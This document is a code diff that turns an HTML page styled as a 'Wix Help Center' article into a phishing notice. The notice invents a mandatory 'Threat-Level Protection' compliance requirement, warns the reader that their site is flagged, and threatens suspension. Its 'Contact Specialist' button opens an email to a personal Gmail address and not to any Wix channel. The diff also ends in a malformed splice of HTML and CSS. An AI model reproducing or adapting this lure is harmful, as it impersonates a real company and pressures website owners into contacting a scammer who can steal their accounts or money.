@@ -1,147 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Wix Help Center - TLP Compliance</title>
+<div class="wrapper">
 
-<style>
-body {
-    margin: 0;
-    font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
-    background-color: #f5f7fa;
-    color: #1a1a1a;
-}
+    <h1>Threat-Level Protection (TLP) Compliance Requirement</h1>
+    <div class="meta">Updated • Security & Compliance</div>
 
-/* ===== NAVBAR ===== */
-.navbar {
-    background: #fff;
-    border-bottom: 1px solid #e6e6e6;
-    padding: 14px 30px;
+    <p>
+        As part of an ongoing platform-wide security initiative, Wix has introduced a mandatory Threat-Level Protection (TLP) compliance framework designed to strengthen the overall safety, reliability, and integrity of all hosted websites. This framework is continuously updated to address evolving cybersecurity threats and to ensure that user data remains protected against unauthorized access, misuse, or exposure.
+    </p>
 
-    display: -webkit-box;
-    display: -ms-flexbox;
-    display: flex;
+    <p>
+        Your website has been identified by our monitoring systems as having an <strong>inactive or improperly configured TLP environment</strong>. This status indicates that one or more required security components are either missing, outdated, or not functioning as expected, which may leave your website vulnerable to potential risks.
+    </p>
 
-    -webkit-box-pack: justify;
-        -ms-flex-pack: justify;
-            justify-content: space-between;
+    <p>
+        Threat-Level Protection (TLP) is a structured set of security protocols that governs how sensitive data is handled, transmitted, and stored across your website. This includes, but is not limited to, user form submissions, login credentials, session authentication processes, and any transactional or payment-related information. When properly configured, TLP significantly reduces the likelihood of data breaches, malicious attacks, and service disruptions.
+    </p>
 
-    -webkit-box-align: center;
-        -ms-flex-align: center;
-            align-items: center;
-}
+    <p>
+        Failure to maintain an active and compliant TLP configuration may expose your website to several risks, including unauthorized data access, compromised user information, degraded site performance, and potential loss of user trust. In more severe cases, non-compliance may result in temporary service limitations or enforced suspension until the required protections are verified.
+    </p>
 
-.logo {
-    font-weight: bold;
-    font-size: 20px;
-}
+    <p>
+        If you have already implemented TLP on your website, you are required to submit your configuration files for verification through the official compliance channel at 
+        <span class="highlight">compliance@support.wix.com</span>. Please ensure that all submitted configurations are complete, accurate, and up to date, as incomplete or invalid submissions may delay the verification process and maintain your flagged status.
+    </p>
 
-.nav-links span {
-    margin-left: 20px;
-    font-size: 14px;
-    color: #555;
-    cursor: pointer;
-}
+    <p>
+        If TLP has not yet been configured, you must initiate and complete the setup process immediately. This includes applying all required security parameters, validating system integrity, and ensuring that all protective measures are fully operational. Delayed action may result in automatic enforcement procedures being applied without further notification.
+    </p>
 
-/* ===== SEARCH BAR ===== */
-.search-section {
-    background: #fff;
-    padding: 30px 20px;
-    text-align: center;
-    border-bottom: 1px solid #e6e6e6;
-}
+    <p>
+        To support users through this process, a designated specialist is available to provide guided assistance with configuration, validation, and submission. This ensures that all required standards are properly implemented and that your website can be reviewed and cleared without unnecessary delays.
+    </p>
 
-.search-box {
-    width: 60%;
-    max-width: 500px;
-    padding: 12px 18px;
-    border-radius: 25px;
-    border: 1px solid #ddd;
-    font-size: 14px;
-}
+    <p>
+        Please note that this compliance requirement is time-sensitive. All flagged websites are expected to complete verification within the designated compliance window. Failure to meet this requirement may trigger automatic restrictions, including temporary suspension of services, until full compliance is achieved and confirmed.
+    </p>
 
-/* ===== LAYOUT ===== */
-.main {
-    max-width: 1200px;
-    margin: 30px auto;
-    padding: 0 20px;
+    <p>
+        We strongly recommend that you take immediate action to resolve this issue and restore your website’s compliance status. Maintaining an active TLP configuration is essential for ensuring uninterrupted service, protecting user data, and preserving the overall integrity of your website.
+    </p>
 
-    display: -webkit-box;
-    display: -ms-flexbox;
-    display: flex;
+    <!-- BUTTON -->
+    <a class="btn" href="mailto:thesupremedigitals@gmail.com?subject=TLP%20Configuration%20Assistance&body=Hello,%0D%0A%0D%0AI%20was%20directed%20to%20request%20assistance%20regarding%20my%20website's%20Threat-Level%20Protection%20(TLP)%20configuration.%0D%0A%0D%0APlease%20provide%20guidance%20on%20the%20necessary%20steps%20to%20complete%20the%20setup%20and%20verification%20process.%0D%0A%0D%0AThank%20you.">
+        Contact Specialist
+    </a>
 
-    gap: 30px;
-}
+    <!-- HELPFUL -->
+    <div class="helpful">
+        <span>Was this article helpful?</span>
+        <button onclick="setHelpful(this)">Yes</button>
+        <button onclick="setHelpful(this)">No</button>
+    </div>
 
-/* ===== SIDEBAR ===== */
-.sidebar {
-    width: 250px;
-    background: #fff;
-    padding: 20px;
-    border-radius: 10px;
-    height: fit-content;
-}
-
-.sidebar h3 {
-    font-size: 16px;
-    margin-bottom: 15px;
-}
-
-.sidebar a {
-    display: block;
-    text-decoration: none;
-    color: #333;
-    font-size: 14px;
-    margin-bottom: 10px;
-}
-
-.sidebar a:hover {
-    color: #116dff;
-}
-
-/* ===== CONTENT ===== */
-.content {
-    -webkit-box-flex: 1;
-        -ms-flex: 1;
-            flex: 1;
-
-    background: #fff;
-    padding: 40px;
-    border-radius: 10px;
-
-    -webkit-box-shadow: 0 4px 20px rgba(0,0,0,0.05);
-            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
-}
-
-h1 {
-    font-size: 26px;
-    margin-bottom: 20px;
-}
-
-p {
-    line-height: 1.7;
-    font-size: 15.5px;
-    margin-bottom: 18px;
-}
-
-/* ===== BUTTON ===== */
-.button-container {
-    text-align: center;
-    margin-top: 40px;
-}
-
-.btn {
-    background-color: #116dff;
-    color: #fff;
-    padding: 14px 28px;
-    border-radius: 25px;
-    text-decoration: none;
-    font-weight: 600;
-
-    -webkit-transition: all 0.3s ease;
-    transition: all 0.3s ease;
+</div>    transition: all 0.3s ease;
 
     display: inline-block;
 }
